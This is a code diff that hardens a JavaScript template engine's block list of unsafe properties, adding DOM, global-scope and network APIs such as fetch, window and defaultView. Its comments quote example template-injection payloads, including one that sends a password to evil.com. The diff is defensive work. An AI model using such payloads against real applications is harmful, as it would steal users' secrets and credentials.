@@ -66,7 +66,28 @@ const UNSAFE_PROPS = Object.assign(Object.create(null), {
   __lookupGetter__: 1, __lookupSetter__: 1,
   // CRITICAL SECURITY FIX: Block access to __rfx_app to prevent app state leak
   // Without this, templates can access the entire internal state via {{ $el.__rfx_app.s.secretToken }}
-  __rfx_app: 1
+  __rfx_app: 1,
+  // CRITICAL SECURITY FIX: Block DOM properties that provide access to window/document/fetch
+  // These properties allow data exfiltration via network requests
+  // Exploit: {{ $el.ownerDocument.defaultView.fetch('https://evil.com?data=' + password) }}
+  ownerDocument: 1,
+  defaultView: 1,
+  contentWindow: 1,
+  contentDocument: 1,
+  // Block direct access to I/O APIs if exposed through objects
+  fetch: 1,
+  XMLHttpRequest: 1,
+  WebSocket: 1,
+  navigator: 1,
+  location: 1,
+  // Block access to global scope
+  window: 1,
+  document: 1,
+  globalThis: 1,
+  self: 1,
+  top: 1,
+  parent: 1,
+  frames: 1
 });
 UNSAFE_PROPS['__proto__'] = 1;
 
